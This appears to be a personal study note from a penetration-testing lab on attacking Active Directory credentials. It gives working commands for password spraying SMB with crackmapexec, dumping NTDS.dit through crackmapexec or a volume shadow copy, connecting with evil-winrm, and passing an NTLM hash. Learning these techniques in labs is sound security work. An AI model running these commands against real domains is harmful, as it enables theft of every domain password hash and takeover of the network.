
Can generate a list of usernames with [[Username Anarchy]] first 

```
crackmapexec smb 10.129.201.57 -u username/username-file.txt -p /usr/share/wordlists/fasttrack.txt
```

Account lock out is not a default group policies that apply to a Windows domain so it may still work. 

# NTDS.dit
NT Directory Services - directory services used with AD to find & organise network resources 

stored in `%systemroot%/ntds`

`.dit` -> directory information tree -> primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information 
# Getting NTDS with crackmapexec 
```
crackmapexec smb 10.129.201.57 -u username -p password --ntds
```


# Getting NTDS manually
Connecting to the AD's DC with evil-winRM 
```
evil-winrm -i 10.129.201.57 -u username -p 'P@55w0rd!'
```

permissions 
```
net localgroup
net user username
```
to make a copy of NTDS.dit file -> user needs both administrator + domain administrator rights

```
vssadmin CREATE SHADOW /For=C;
```

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Transfer the same way as [[SAM]] by setting up a [[SMB Server]] 

Crack the hashes using [[hashcat]]

# Pass the hash
we can also try to authenticate with the hash
```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```